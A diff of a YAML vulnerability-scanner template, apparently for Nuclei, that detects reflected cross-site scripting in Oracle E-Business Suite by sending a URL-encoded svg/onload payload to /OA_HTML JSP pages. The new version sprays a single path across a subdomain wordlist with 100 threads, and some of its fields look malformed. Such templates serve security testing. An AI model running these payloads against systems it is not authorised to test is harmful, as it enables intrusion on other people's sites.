@@ -1,36 +1,49 @@
-id: oracle-ebs-xss
-
+id: oracle-ebs-xss 3
 info:
-  name: Oracle E-Business Suite - Cross-Site Scripting
   author: dhiyaneshDk
-  severity: medium
-  reference:
+  name: Oracle EBS XSS
+  reference: '- https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf
+
     - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite.pdf
+
     - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
+
+    '
+  severity: medium
   tags: oracle,xss,ebs
-  metadata:
-    max-request: 3
+requests:
+- attack: sniper
+  matchers:
+  - part: body
+    type: word
+    words:
+    - <svg/onload=alert('{{randstr}}')>
+  - status:
+    - 200
+    type: status
+  - part: header
+    type: word
+    words:
+    - text/html
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert(''{{randstr}}'')%3E
+    HTTP/1.1
 
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E"
-      - "{{BaseURL}}/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E"
-      - "{{BaseURL}}/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E"
+    Host: {{Subdomains}}
 
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "<svg/onload=alert('{{randstr}}')>"
-        part: body
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
+    Firefox/65.0
 
-      - type: status
-        status:
-          - 200
-      - type: word
-        words:
-          - "text/html"
-        part: header
+    Connection: close
 
-# Enhanced by md on 2022/09/19
+    Accept: */*
+
+    Accept-Language: en
+
+    Accept-Encoding: gzip
+
+    '
+  threads: 100
